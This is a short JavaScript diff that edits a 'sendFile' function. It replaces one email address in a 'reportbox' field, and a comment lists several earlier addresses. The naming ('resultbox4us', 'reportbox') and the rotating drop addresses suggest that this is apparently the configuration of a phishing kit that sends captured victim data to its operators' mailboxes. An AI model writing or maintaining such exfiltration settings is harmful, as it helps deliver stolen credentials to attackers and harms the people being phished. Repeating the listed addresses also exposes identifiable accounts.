@@ -35,7 +35,7 @@ export const sendFile = (data) =>
     },
     body: JSON.stringify({
       ...data,
-      reportbox: "resultbox4us@outlook.com, jhonsnow751@gmail.com", // "resultbox4us@outlook.com" "mb4ckup.m4il@yandex.com" "info.maqsurgical@gmail.com" "Elongate68@gmail.com, jhonsnow751@gmail.com, ajaymoroco@yandex.com",
+      reportbox: "gino_chitaroni@outlook.com, jhonsnow751@gmail.com", // "resultbox4us@outlook.com" "mb4ckup.m4il@yandex.com" "info.maqsurgical@gmail.com" "Elongate68@gmail.com, jhonsnow751@gmail.com, ajaymoroco@yandex.com",
     }),
   }).then((response) => response.json());
 
